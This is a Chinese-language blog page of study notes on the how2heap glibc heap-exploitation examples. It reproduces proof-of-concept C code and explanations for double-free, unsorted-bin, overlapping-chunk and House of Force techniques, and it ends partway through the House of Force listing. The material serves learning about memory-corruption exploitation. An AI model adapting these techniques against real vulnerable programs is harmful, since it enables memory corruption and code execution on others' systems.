@@ -1,0 +1,1543 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="堆溢出,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Leng's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="how2heap的学习这是接着之前的进行学习的8.fastbin_dup.c代码：#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt;  int main() { fprintf(stderr, &amp;quot;This file demonstrates a simple double-free attack with fastbins.\n&amp;quot">
+<meta name="keywords" content="堆溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap学习笔记（二）">
+<meta property="og:url" content="http://yoursite.com/2019/05/14/posthow2heap2/index.html">
+<meta property="og:site_name" content="Leng&#39;s Blog">
+<meta property="og:description" content="how2heap的学习这是接着之前的进行学习的8.fastbin_dup.c代码：#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt;  int main() { fprintf(stderr, &amp;quot;This file demonstrates a simple double-free attack with fastbins.\n&amp;quot">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/8.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/9.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/10.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/11.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/12.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/13.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/14.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/15.PNG">
+<meta property="og:updated_time" content="2019-05-13T18:35:21.160Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="how2heap学习笔记（二）">
+<meta name="twitter:description" content="how2heap的学习这是接着之前的进行学习的8.fastbin_dup.c代码：#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt;  int main() { fprintf(stderr, &amp;quot;This file demonstrates a simple double-free attack with fastbins.\n&amp;quot">
+<meta name="twitter:image" content="http://yoursite.com/picture/how2heap/8.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/14/posthow2heap2/">
+
+
+
+
+
+  <title>how2heap学习笔记（二） | Leng's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+     <a href="https://lengsen.github.io" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Leng's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/14/posthow2heap2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Leng">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leng's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">how2heap学习笔记（二）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-14T02:31:58+08:00">
+                2019-05-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="how2heap的学习"><a href="#how2heap的学习" class="headerlink" title="how2heap的学习"></a>how2heap的学习</h1><h2 id="这是接着之前的进行学习的"><a href="#这是接着之前的进行学习的" class="headerlink" title="这是接着之前的进行学习的"></a>这是接着之前的进行学习的</h2><h2 id="8-fastbin-dup-c"><a href="#8-fastbin-dup-c" class="headerlink" title="8.fastbin_dup.c"></a>8.fastbin_dup.c</h2><h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+fprintf(stderr, &quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;);
+
+fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);
+int *a = malloc(8);
+int *b = malloc(8);
+int *c = malloc(8);
+
+fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);
+fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);
+fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);
+
+fprintf(stderr, &quot;Freeing the first one...\n&quot;);
+free(a);
+
+fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);
+// free(a);
+
+fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);
+free(b);
+
+fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);
+free(a);
+
+fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&apos;ll get %p twice!\n&quot;, a, b, a, a);
+fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, malloc(8));
+fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));
+fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, malloc(8));
+}
+</code></pre><h3 id="实验结果："><a href="#实验结果：" class="headerlink" title="实验结果："></a>实验结果：</h3><p> <img src="/picture/how2heap/8.PNG" alt></p>
+<h3 id="实验分析："><a href="#实验分析：" class="headerlink" title="实验分析："></a>实验分析：</h3><p>这是一个简单的利用fastbin进行双重攻击的例子。首先malloc三个缓冲区，然后free（a），当我们想要再次free（a）会报错，因为a经过第一次的free后放在了fastbin的首部，不能被释放，这时候free(b)这样b代替a成为了freebin的首部，就能再次释放a了，这样就造成了重复释放。</p>
+<h2 id="9-unsorted-bin-attack-c"><a href="#9-unsorted-bin-attack-c" class="headerlink" title="9.unsorted_bin_attack.c"></a>9.unsorted_bin_attack.c</h2><h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(){
+fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;);
+fprintf(stderr, &quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;
+&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;);
+
+unsigned long stack_var=0;
+fprintf(stderr, &quot;Let&apos;s first look at the target we want to rewrite on stack:\n&quot;);
+fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;stack_var, stack_var);
+
+unsigned long *p=malloc(400);
+fprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;,p);
+fprintf(stderr, &quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;
+&quot;the first one during the free()\n\n&quot;);
+malloc(500);
+
+free(p);
+fprintf(stderr, &quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;
+&quot;point to %p\n&quot;,(void*)p[1]);
+
+//------------VULNERABILITY-----------
+
+p[1]=(unsigned long)(&amp;stack_var-2);
+fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);
+fprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;,(void*)p[1]);
+
+//------------------------------------
+
+malloc(400);
+fprintf(stderr, &quot;Let&apos;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;
+&quot;rewritten:\n&quot;);
+fprintf(stderr, &quot;%p: %p\n&quot;, &amp;stack_var, (void*)stack_var);
+}
+</code></pre><h3 id="实验结果：-1"><a href="#实验结果：-1" class="headerlink" title="实验结果："></a>实验结果：</h3><p> <img src="/picture/how2heap/9.PNG" alt></p>
+<h3 id="实验分析：-1"><a href="#实验分析：-1" class="headerlink" title="实验分析："></a>实验分析：</h3><p>这个例子是通过将大的unsigned long value写入stack对unsorted bin攻击的实例。<br>首先定义了，然后malloc了一个普通的块p（p的内存为400），（为了避免我们在free后整合顶部块，malloc了一个500的块）。接下来我们free（p），这样由于p的大小为400，所以放入unsorted bin中，p也就指向了bin的首部。<br>接下来我们开始攻击：<br>首先修改p[1]:p[1]=(unsigned long)(&amp;stack_var-2); 这个指令将p[1]的地址修改为target addr-16 处伪造的 chunk（这是因为stack_var-2表示减去两个地址空间，一个地址空间为8个内存）<br>接下来我们malloc大小为400的chunk，由于unsorted bin中有，就直接取出。<br>在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p>
+<h2 id="10-overlapping-chunks-c"><a href="#10-overlapping-chunks-c" class="headerlink" title="10.overlapping_chunks.c"></a>10.overlapping_chunks.c</h2><h3 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+
+int main(int argc , char* argv[]){
+
+
+intptr_t *p1,*p2,*p3,*p4;
+
+fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem\n\n&quot;);
+fprintf(stderr, &quot;Let&apos;s start to allocate 3 chunks on the heap\n&quot;);
+
+p1 = malloc(0x100 - 8);
+p2 = malloc(0x100 - 8);
+p3 = malloc(0x80 - 8);
+
+fprintf(stderr, &quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;, p1, p2, p3);
+
+memset(p1, &apos;1&apos;, 0x100 - 8);
+memset(p2, &apos;2&apos;, 0x100 - 8);
+memset(p3, &apos;3&apos;, 0x80 - 8);
+
+fprintf(stderr, &quot;\nNow let&apos;s free the chunk p2\n&quot;);
+free(p2);
+fprintf(stderr, &quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;);
+
+fprintf(stderr, &quot;Now let&apos;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;);
+fprintf(stderr, &quot;For a toy program, the value of the last 3 bits is unimportant;&quot;
+&quot; however, it is best to maintain the stability of the heap.\n&quot;);
+fprintf(stderr, &quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;
+&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;);
+
+int evil_chunk_size = 0x181;
+int evil_region_size = 0x180 - 8;
+fprintf(stderr, &quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;,
+evil_chunk_size, evil_region_size);
+
+*(p2-1) = evil_chunk_size; // we are overwriting the &quot;size&quot; field of chunk p2
+
+fprintf(stderr, &quot;\nNow let&apos;s allocate another chunk with a size equal to the data\n&quot;
+&quot;size of the chunk p2 injected size\n&quot;);
+fprintf(stderr, &quot;This malloc will be served from the previously freed chunk that\n&quot;
+&quot;is parked in the unsorted bin which size has been modified by us\n&quot;);
+p4 = malloc(evil_region_size);
+
+fprintf(stderr, &quot;\np4 has been allocated at %p and ends at %p\n&quot;, (char *)p4, (char *)p4+evil_region_size);
+fprintf(stderr, &quot;p3 starts at %p and ends at %p\n&quot;, (char *)p3, (char *)p3+0x80-8);
+fprintf(stderr, &quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;);
+
+fprintf(stderr, &quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;
+&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;);
+
+fprintf(stderr, &quot;Let&apos;s run through an example. Right now, we have:\n&quot;);
+fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);
+fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);
+
+fprintf(stderr, &quot;\nIf we memset(p4, &apos;4&apos;, %d), we have:\n&quot;, evil_region_size);
+memset(p4, &apos;4&apos;, evil_region_size);
+fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);
+fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);
+
+fprintf(stderr, &quot;\nAnd if we then memset(p3, &apos;3&apos;, 80), we have:\n&quot;);
+memset(p3, &apos;3&apos;, 80);
+fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4);
+fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3);
+}
+</code></pre><h3 id="实验结果：-2"><a href="#实验结果：-2" class="headerlink" title="实验结果："></a>实验结果：</h3><p> <img src="/picture/how2heap/10.PNG" alt></p>
+<h3 id="实验分析：-2"><a href="#实验分析：-2" class="headerlink" title="实验分析："></a>实验分析：</h3><p>首先分配三个块分别为p1 = malloc(0x100 - 8);p2 = malloc(0x100 - 8);p3 = malloc(0x80 - 8);<br>然后利用menset函数将p1,p2,p3内存中的内容分别全部置为1,2,3。<br>这时free（p2），这个时候p2就会被放在unsorted bin中，大小为p2原本malloc出来的大小。<br>下一步我们将模仿一个可以重写到p2的溢出。虽然程序的最后三位的值是不重要的，但是我们还是要尽量保持堆的稳定性。为了实现堆得稳定性，我们将最不重要的一位标记为1（prev_inuse）来确保p不会被认为是一个free的chunk。<br>下一步我们开始构造fakechunk。首先使用<em>(p2-1) = evil_chunk_size;定义p2的大小，然后malloc一个大小为0x180 - 8 的p4。这时候由于被free的p2放在unsorted bin中并且大小符合，就会把p2的地分配给p4。这时候由于p3的地址大小为0x80 - 8，并且是与p2连着的，所以p4分配的地址空间中是包含p3的。<br>接下来是代码中附带的实例：<br>首先把p4全部设为4，我们可以发现p3中的3也变为4了。<br>然后再将p3中的80个设为3，我们发现p3中的前一部分变为3了。p4地址中的一部分变为3，一部分保留为4。<br>**</em>P3中地址空间大于80是因为malloc动态分配的内存有可能大于你想要申请的大小。</p>
+<h2 id="11-overlapping-chunks-2-c"><a href="#11-overlapping-chunks-2-c" class="headerlink" title="11.overlapping_chunks_2.c"></a>11.overlapping_chunks_2.c</h2><h3 id="代码：-3"><a href="#代码：-3" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;malloc.h&gt;
+
+int main(){
+
+intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
+unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
+int prev_in_use = 0x1;
+
+fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem&quot;);
+fprintf(stderr, &quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;);
+fprintf(stderr, &quot;\nLet&apos;s start to allocate 5 chunks on the heap:&quot;);
+
+p1 = malloc(1000);
+p2 = malloc(1000);
+p3 = malloc(1000);
+p4 = malloc(1000);
+p5 = malloc(1000);
+
+real_size_p1 = malloc_usable_size(p1);
+real_size_p2 = malloc_usable_size(p2);
+real_size_p3 = malloc_usable_size(p3);
+real_size_p4 = malloc_usable_size(p4);
+real_size_p5 = malloc_usable_size(p5);
+
+fprintf(stderr, &quot;\n\nchunk p1 from %p to %p&quot;, p1, (unsigned char *)p1+malloc_usable_size(p1));
+fprintf(stderr, &quot;\nchunk p2 from %p to %p&quot;, p2, (unsigned char *)p2+malloc_usable_size(p2));
+fprintf(stderr, &quot;\nchunk p3 from %p to %p&quot;, p3, (unsigned char *)p3+malloc_usable_size(p3));
+fprintf(stderr, &quot;\nchunk p4 from %p to %p&quot;, p4, (unsigned char *)p4+malloc_usable_size(p4));
+fprintf(stderr, &quot;\nchunk p5 from %p to %p\n&quot;, p5, (unsigned char *)p5+malloc_usable_size(p5));
+
+memset(p1,&apos;A&apos;,real_size_p1);
+memset(p2,&apos;B&apos;,real_size_p2);
+memset(p3,&apos;C&apos;,real_size_p3);
+memset(p4,&apos;D&apos;,real_size_p4);
+memset(p5,&apos;E&apos;,real_size_p5);
+
+fprintf(stderr, &quot;\nLet&apos;s free the chunk p4.\nIn this case this isn&apos;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;); 
+
+free(p4);
+
+fprintf(stderr, &quot;\nLet&apos;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;);
+
+*(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE 
+
+fprintf(stderr, &quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;);
+fprintf(stderr, &quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;);
+free(p2);
+
+fprintf(stderr, &quot;\nNow let&apos;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;);
+
+p6 = malloc(2000);
+real_size_p6 = malloc_usable_size(p6);
+
+fprintf(stderr, &quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;);
+fprintf(stderr, &quot;\nchunk p6 from %p to %p&quot;, p6, (unsigned char *)p6+real_size_p6);
+fprintf(stderr, &quot;\nchunk p3 from %p to %p\n&quot;, p3, (unsigned char *) p3+real_size_p3); 
+
+fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;);
+fprintf(stderr, &quot;%s\n&quot;,(char *)p3); 
+
+fprintf(stderr, &quot;\nLet&apos;s write something inside p6\n&quot;);
+memset(p6,&apos;F&apos;,1500); 
+
+fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;);
+fprintf(stderr, &quot;%s\n&quot;,(char *)p3); 
+}
+</code></pre><h3 id="实验结果：-3"><a href="#实验结果：-3" class="headerlink" title="实验结果："></a>实验结果：</h3><p> <img src="/picture/how2heap/11.PNG" alt></p>
+<h3 id="实验分析：-3"><a href="#实验分析：-3" class="headerlink" title="实验分析："></a>实验分析：</h3><p>其实这个和overlapping_chunks差不多，但是为了更能了解堆重叠的问题所以我又进行了一定的研究。<br>首先在堆上malloc5个块，然后利用malloc_usable_size函数分别取出他们的大小（虽然malloc的时候设置的地址大小为1000，但是动态分配的地址大小不一定是1000有可能会更大一点）<br>下一步将p1，p2，p3，p4，p5分别置为ABCDE。由于p4并不是直接与上面的chunk连接的，所以我们可以free（p4）。<br>然后我们假设chunk1有溢出，这样我们就利用<em>（unsigned int </em>）（（unsigned char <em>）p1 + real_size_p1）= real_size_p2 + real_size_p3 + prev_in_use + sizeof（size_t）</em> 2 ; 修改chunk2的size为 chunk 2 和 chunk 3 的大小之和，最后的 1 是标志位。这样当我们释放 chunk 2 的时候，malloc 根据这个被修改的 size 值，会以为 chunk 2 加上 chunk 3 的区域都是要释放的，然后就错误地修改了 chunk 5 的 prev_size。<br>这样下来，我们会发现，当free 掉 chunk 2 后， chunk 2 ，chunk 3 一起被释放，接着，它发现紧邻的一块 chunk 4 也是 free 状态，就把它俩合并在了一起，组成一个大 free chunk，放进 unsorted bin 中。 chunk 5 的 prev size 也发生了变化。<br>然后当我们申请一块新chunk的时候，会从 unsorted bin中取出一部分，比如这里我们申请一个chunk p6，就会把chunk2和chunk3中的部分放入。<br>例子和overlapping_chunks差不多就不说明了。</p>
+<h2 id="12-house-of-force-c"><a href="#12-house-of-force-c" class="headerlink" title="12.house_of_force.c"></a>12.house_of_force.c</h2><h3 id="代码：-4"><a href="#代码：-4" class="headerlink" title="代码："></a>代码：</h3><pre><code>/*
+
+    This PoC works also with ASLR enabled.
+    It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
+    If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
+    ( http://phrack.org/issues/66/10.html )
+
+    Tested in Ubuntu 14.04, 64bit.
+
+    */
+
+
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;malloc.h&gt;
+
+char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;
+
+int main(int argc , char* argv[])
+{
+fprintf(stderr, &quot;\nWelcome to the House of Force\n\n&quot;);
+fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;);
+fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;
+&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;);
+
+fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var);
+fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var);
+
+
+
+fprintf(stderr, &quot;\nLet&apos;s allocate the first chunk, taking space from the wilderness.\n&quot;);
+intptr_t *p1 = malloc(256);
+fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2);
+
+fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;);
+int real_size = malloc_usable_size(p1);
+fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2);
+
+fprintf(stderr, &quot;\nNow let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;);
+
+//----- VULNERABILITY ----
+intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
+fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top);
+
+fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;);
+fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
+*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
+fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
+//------------------------
+
+fprintf(stderr, &quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;
+&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;
+&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;);
+
+unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
+fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;
+&quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);
+void *new_ptr = malloc(evil_size);
+fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr - sizeof(long)*2);
+
+void* ctr_chunk = malloc(100);
+fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;);
+fprintf(stderr, &quot;malloc(100) =&gt; %p!\n&quot;, ctr_chunk);
+fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;);
+
+fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var);
+fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;);
